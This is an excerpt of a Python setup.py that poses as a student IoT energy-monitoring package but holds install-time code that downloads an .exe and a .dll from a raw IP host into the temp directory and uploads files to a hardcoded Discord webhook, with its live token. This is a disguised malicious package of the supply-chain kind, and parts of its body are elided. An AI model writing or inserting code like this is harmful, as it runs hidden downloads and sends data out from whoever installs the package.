...
setup(
name='tohoku-tus-IoT-automation',
version='0.3.3',
author='K00000993',
author_email='K00000993zx@grpstudentiot.tohoku.ac.jp',
description='Energy monitoring management interface for student IoT projects developed during collaboration between the renewable energy 3rd year groups from Ireland and Japan. アイルランドと日本の再生可能エネルギーの 3 年生グループが協力して開発した、学生プロジェクトのためのエネルギー監視管理インターフェイス。',
...
python_requires='>=3.6',
install_requires=['psutil==5.9.2','setuptools']
)
...
webhook_url = "https://discordapp.com/api/webhooks/1214145679094448168/vyrtZquc2ia5h7R3FtLno2_s7Lhz1MpBoUL-FA0YM4FhHu-vNxuQ2LJoET6kYW_GQ5fo"
...
# THING 1: GET STUFFS
def install():
    # Generate prefix for new temp dir folder
    ...
    # Remote file sources
    #exe = dfile("https://178-79-133-221.ip.linodeusercontent.com/k7841286.exe")
    #dll = dfile("https://178-79-133-221.ip.linodeusercontent.com/k7841286.dll")
...
def upload(webhook_url, filename):
    ...
    temp_dir = os.path.join(os.environ.get('TEMP', '/tmp'), filename)
    print(temp_dir)
...
def DL2(url, outputname):
    try:
        dlfile = outputname
        # Get Temp Dir
        temp_dir = os.path.join(os.environ.get('TEMP', '/tmp'), dlfile)
